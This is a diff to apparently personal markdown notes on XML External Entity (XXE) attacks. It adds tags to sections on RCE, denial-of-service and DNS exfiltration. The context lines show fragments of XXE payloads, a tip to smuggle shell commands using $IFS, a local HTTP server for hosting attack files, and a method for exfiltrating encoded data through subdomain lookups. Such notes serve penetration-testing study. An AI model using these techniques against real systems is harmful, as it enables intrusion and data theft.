@@ -1,4 +1,3 @@
-
 https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 
 ##### JSON to XML:
@@ -137,6 +136,7 @@ python -m http.server 1337
 ```
 
 #### RCE
+[[RCE]]
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE email [
@@ -153,6 +153,7 @@ python -m http.server 1337
 **Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.
 
 #### DDOS
+[[DDOS]]
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE email [
@@ -225,6 +226,7 @@ or
 ```
 
 ##### DNS exfiltration
+[[DNS]]
 Put data to subdomain and check with tcmpdump.
 `ENCODEDTEXT.our.website.com`
 #### Automation
